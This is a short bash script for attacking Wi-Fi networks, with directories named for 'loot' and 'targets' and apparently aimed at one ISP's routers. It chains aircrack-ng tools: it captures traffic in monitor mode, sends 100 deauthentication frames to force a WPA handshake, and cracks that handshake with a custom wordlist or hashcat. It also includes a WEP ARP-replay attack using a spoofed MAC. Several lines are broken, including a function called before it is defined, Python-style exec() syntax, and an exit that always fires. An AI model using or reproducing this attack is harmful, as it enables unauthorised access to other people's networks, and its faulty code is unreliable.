#! /bin/bash
## AirMon/Crack-Ng - TPG xxxx

LOOTDIR=/root/Dropbox/blackHattery/loot
WORDLISTDIR=/root/Dropbox/blackHattery/customWordlists
TARGETDIR=/root/Dropbox/blackHattery/targets
WORDLIST=tpglist.txt
TARGETLIST=tpgtargets.txt

INTERF=wlan1
MONFACE=wlan1mon

TPGTARGETID=

for i in $TPGTARGETID
do
    hitEm
done

hitEm(){
    BSSID=$1
    CHANNEL=$2
    # start network device, put into monitor mode, listen beacon frames to get target BSSID and channel
    airmon-ng start $INTERF || echo "error starting $INTERF" && exit
    # capture packets
    # - choose BSSID to target
    airodump-ng $MONFACE
    # -target chosen network to monitor
    airodump-ng -c $CHANNEL --bssid $BSSID --write $LOOTDIR/$CHANNEL-$BSSID.cap $MONFACE
    # (write output to $FILE)
    #deauth to get handshake
    exec('aireplay-ng --deauth 100 -a $BSSID $MONFACE')
    #
    ###
    echo "offline from here -- if you have a good valid handshake"
    # crack w/ password list
    aircrack-ng $LOOTDIR/$CHANNEL-$BSSID.cap -w $WORDLISTDIR/$WORDLIST

}

otherOptions(){

    ########## or crack password with naive-hashcat ##########
    # convert cap to hccapx
    cap2hccapx.bin capture/-01.cap capture/-01.hccapx
    # crack with naive-hashcat
    HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh



    ######## or WEP ones using IVs #####
    ## spoof and ARP attack
    # We will be capturing an ARP packet and then replaying that ARP thousands of times in order to generate the IVs that we need to crack WEP.

    aireplay-ng -3 -b $BSSID -h $MAC2SPOOF $MONFACE
    # once you have thousands of IVs ...
    aircrack-ng $WEPFILE.cap
}
